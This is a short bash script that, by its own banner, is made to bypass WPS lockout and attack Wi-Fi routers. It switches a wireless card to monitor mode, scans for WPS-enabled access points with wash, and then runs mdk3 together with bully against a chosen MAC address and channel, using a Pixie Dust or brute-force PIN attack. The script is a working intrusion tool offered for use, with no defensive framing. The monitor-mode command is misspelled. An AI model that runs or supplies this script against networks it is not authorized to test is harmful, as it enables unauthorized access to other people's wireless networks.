echo "THIS SCRIPT MADE FOR  WPS_LOCKOUT BYPASS" | toilet 







echo "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°"
echo '°°°°°*MADE BY ANES_CHEBLAOUI*°'
echo "**THIS IS YOUR  INTERFACES**"
echo '***************************'
echo '        *********         '
echo '          *****           '
echo '            *             '
ip a | grep ":" && echo ''


echo "what is WLAN carte ?"
read WLAN
systemctl stop NetworkManager.service

ifconfig $WLAN down
iwconfig $WLAN mode montior ; ifconfig $WLAN up
qterminal  -e "wash  -i $WLAN -2 -s    -p" 
echo "what is mac address of the target ?"
read mac
echo "what is the channel the target are using ?"
read channel
printf 'what is wps attack method? if dust_attack  choose (-d) and if wps brute force shoose (-B) default  is -B '
read  metoud
terminator  -e "mdk3 $WLAN  m -t $mac    -c $channel  | bully -b $mac  -v 3 -C -F -M  $metoud   $WLAN -c $channel"
